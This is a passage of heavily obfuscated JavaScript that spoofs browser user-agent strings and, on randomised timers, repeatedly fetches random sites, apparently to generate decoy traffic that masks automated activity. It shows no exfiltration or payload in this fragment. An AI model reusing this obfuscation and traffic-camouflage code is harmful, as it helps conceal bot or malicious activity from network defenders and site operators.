      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + a6(0x1f) + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x320 + 0x12c0 + -0x15e0; k < 0x6 * -0x56b + -0xc * -0x18a + 0x101 * 0xe; k++)
    setTimeout(f, (-0x1 * 0x7c46 + -0x70b4 + 0x1d75a) * k * getRandomInt(-0xaba + -0xd08 + 0x17c3, 0x2 * 0x1213 + 0x18ec + -0x3d0f));
  setInterval(() => {
    f();
    for (let l = 0x15d * 0x3 + 0x9af + -0xdc6; l < 0x11 * -0x157 + -0x2ef * -0xa + -0x68b * 0x1; l++)
      setTimeout(f, (-0x2 * 0x37f3 + -0xb3cf * 0x2 + 0x2c1e4) * l * getRandomInt(0xbb6 + -0x81c * 0x3 + 0x1 * 0xc9f, 0x62b + 0x1 * -0x53a + -0xee));
  }, -0x658b7 * 0xa + 0x5536f1 + 0x212eb5);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x28e4 + 0xb * -0x16b + -0xaf * -0x3) * getRandomInt(0x15b0 + -0x4 * -0x76f + -0x336b, 0x15d * 0xa + -0xc5 * 0x9 + -0x6b0));
}, 0x2f3 + -0x129b + 0x100c);